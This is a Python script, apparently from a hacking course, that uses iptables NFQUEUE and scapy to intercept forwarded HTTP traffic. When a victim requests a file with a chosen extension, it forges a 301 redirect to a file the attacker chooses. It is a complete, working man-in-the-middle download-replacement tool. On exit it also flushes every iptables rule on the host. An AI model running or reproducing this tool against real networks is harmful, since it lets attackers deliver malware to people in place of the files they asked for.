##!/usr/bin/env python

# Python 3.8
# https://github.com/kti/python-netfilterqueue
# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
# pip install -U git+https://github.com/kti/python-netfilterqueue
import argparse
import subprocess

import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(file_ext, load):
    print(file_ext, load)
    print(type(file_ext), type(load))

    def inner(packet):
        scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                # HTTP request
                if str(file_ext) in scapy_packet[scapy.Raw].load:
                    print("[+] File request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                # HTTP response
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    packet_load = "HTTP/1.1 301 Moved Permanently\nLocation: " + load + "\n\n"
                    modified_packet = set_load(scapy_packet, packet_load)

                    packet.set_payload(str(modified_packet))

        packet.accept()

    return inner


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--ext", dest="file_ext", help="File extension to catch")
    parser.add_argument("-l", "--load", dest="load", help="Reference to file")
    options = parser.parse_args()
    if not options.file_ext:
        parser.error("[-] Please specify a file extension, use --help for more info")
    elif not options.load:
        parser.error("[-] Please specify a load file, use --help for more info")
    return options


try:
    # traps all packets from FORWARD chain to NFQUEUE
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    print("Setup iptables done")

    options = get_arguments()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet(options.file_ext, options.load))
    queue.run()
except KeyboardInterrupt:
    print("Exiting...")
except Exception:
    print("Something went wrong!")
finally:
    print("Flushing iptables...")
    subprocess.call("iptables --flush", shell=True)
